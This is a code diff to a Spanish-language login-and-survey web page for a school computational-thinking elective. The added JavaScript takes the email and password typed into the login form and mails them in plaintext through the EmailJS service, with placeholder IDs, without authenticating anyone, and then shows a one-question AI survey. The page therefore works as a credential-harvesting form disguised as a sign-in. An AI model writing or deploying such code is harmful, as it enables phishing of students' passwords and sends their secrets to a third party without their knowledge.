@@ -57,12 +57,19 @@
     background-color: #0056b3;
   }
 </style>
+<!-- EmailJS SDK -->
+<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("TU_USER_ID");
+   })();
+</script>
 </head>
 <body>
 
-<div class="container">
+<div class="container" id="loginContainer">
   <h1>Iniciar sesión</h1>
-  <form action="procesar_login.php" method="post">
+  <form id="loginForm" action="#" method="post">
     <label for="email">Correo electrónico</label>
     <input type="email" id="email" name="email" placeholder="Correo electrónico" required>
     <label for="password">Contraseña</label>
@@ -71,15 +78,53 @@
   </form>
 </div>
 
-<div class="container">
+<div class="container" id="surveyContainer" style="display: none;">
   <h2>Electivo Pensamiento Computacional</h2>
   <h1>Encuesta sobre inteligencia artificial y estudios</h1>
-  <form action="procesar_encuesta.php" method="post">
+  <form id="surveyForm" action="#" method="post">
     <label for="aiHelp">¿Crees que con IA puede ayudarte a tus estudios?</label>
     <input type="text" id="aiHelp" name="aiHelp" placeholder="Escribe tu respuesta aquí" required>
     <input type="submit" value="Enviar respuesta">
   </form>
 </div>
 
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+  event.preventDefault();
+  var email = document.getElementById("email").value;
+  var password = document.getElementById("password").value;
+  
+  // Enviar correo electrónico con los datos de inicio de sesión
+  emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", {
+    from_name: email,
+    message: "Correo electrónico: " + email + "\nContraseña: " + password
+  })
+  .then(function(response) {
+    console.log("SUCCESS!", response.status, response.text);
+    document.getElementById("loginContainer").style.display = "none";
+    document.getElementById("surveyContainer").style.display = "block";
+  }, function(error) {
+    console.log("FAILED...", error);
+  });
+});
+
+document.getElementById("surveyForm").addEventListener("submit", function(event) {
+  event.preventDefault();
+  var aiHelp = document.getElementById("aiHelp").value;
+
+  // Enviar correo electrónico con la respuesta de la encuesta
+  emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", {
+    message: "Respuesta: " + aiHelp
+  })
+  .then(function(response) {
+    console.log("SUCCESS!", response.status, response.text);
+    alert("Gracias por participar");
+  }, function(error) {
+    console.log("FAILED...", error);
+  });
+});
+</script>
+
 </body>
 </html>
+
